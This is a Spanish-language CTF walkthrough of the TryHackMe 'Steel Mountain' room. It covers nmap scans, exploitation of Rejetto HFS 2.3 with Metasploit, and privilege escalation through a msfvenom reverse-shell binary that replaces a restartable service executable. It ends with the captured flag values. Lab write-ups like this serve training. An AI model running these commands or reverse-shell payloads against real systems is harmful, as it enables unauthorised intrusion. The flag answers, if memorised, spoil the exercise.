# Steel Mountain

Plataforma: TryHackMe
OS: Linux
Level: Easy
Status: Done
Complete: Yes
EJPT: yes
Created time: 15 de diciembre de 2024 19:06
IP: 10.10.37.44

# **Reconocimiento (Recon)**

- [ ]  **Nmap inicial**:

```bash
sudo nmap -p- --open -T5 -sS --min-rate 5000 -vvv -n -Pn 10.10.37.44 -oG allPorts

```

**Puertos Abiertos**:

80,135,139,445,3389,5985,8080,47001,49153,49155,49163,49164

![image.png](<imagenes/image 20.png>)

- [ ]  **Nmap serveis**

```bash
sudo nmap -sCV -p1,2,3 10.10.37.44 -oN nmap
sudo nmap -v -sV -O --script="safe and vuln" -T4 -n -Pn -p135,445 -oA nmap 10.10.37.44

```

![image.png](<imagenes/image 21.png>)

# **Análisis de Vulnerabilidades**

Miramos las dos paginas web.
Vemos que la web alojada en el 8080 corre:

**HttpFile Server 2.3**

- **Vulnerabilidad Potencial**: HTTPFileServer 2.3 (CVE 2014-6287)
- **Exploit Disponibles**:
    
    ```bash
    searchsploit rejetto HTTP File Server
    HTTP File Server (HFS) Unauthenticated Remote Code Execution
    
    ```
    

# **Explotación (Exploit)**

**Metasploit**:

```bash
msfconsole
search rejetto HttpFileServer
use 0
set RHOST IP
set RPORT 8080
set TARGETURI /
set LHOST localIP

```

msf6 exploit(windows/http/rejetto_hfs_exec)

![image.png](<imagenes/image 22.png>)

- **Resultados**: Probamos pero da error.
Cambiamos payload a : payload/windows/meterpreter/reverse_http

```bash
set PAYLOAD 73
run

```

Obtenemos shell meterpreter

# **Escalada de Privilegios**

**Enumeración de Privilegios**: Bajamos el script de Powershell, PowerUp.ps1 para enumerar el sistema

```bash
upload PowerhShell.ps1
```

![image.png](<imagenes/image 23.png>)

- **Vulnerabilidad Encontrada**: Servicio que se puede reiniciar
- **Método de Escalada**: Creamos con msfvenom el payload
    
    ```bash
    msfvenom -p windows/shell_reverse_tcp LHOST=10.8.49.154 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advance.exe
    ```
    

Para subirlo a :
Ruta:
C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
Nombre: AdvancedSystemCareService9

Paramos el servicio:

```bash
sc stop AdvancedSystemCareService9
```

Sobreescribimos el fichero ASCService.exe por el payload de msfvenom y renombramos

Abrimos un handler en Metasploit para recibir la consola:

```bash
msfconsole> search exploit/handler/multi
set LHOST nuestaIP
set LPORT 4443
exploit -j
sessions -i 1 'Para volver a la consola de meterpreter'

```

Reiniciamos el servicio :

```bash
sc start AdvancedSystemCareService9
'Al momento recibimos la shell del handler'
'Ponemos el terminal en background'
'volvemos a msfconsole'
sessions -i
'seleccionamos la shell que se ha creado'
session -i 2
 Obtenemos la shell con permisos de System

```

# **Post-Explotación**

Obtención de User.txt

- **Localización**:

```bash
dir root.txt /s
Directory of C:\\Users\\Administrator\\Desktop

```

- **Contenido**:

```bash
 type root.txt
 9af5f314f57607c00fd09803a587db80

```

### 5.2 Obtención de Root.txt

- **Localización**:
    
    ```bash
    dir user.txt /s
    Directory of C:\\Users\\bill\\Desktop\\
    
    ```
    
- **Contenido**:

```bash
   type user.txt
   b04763b6fcf51fcd7c13abc7db4fd365

```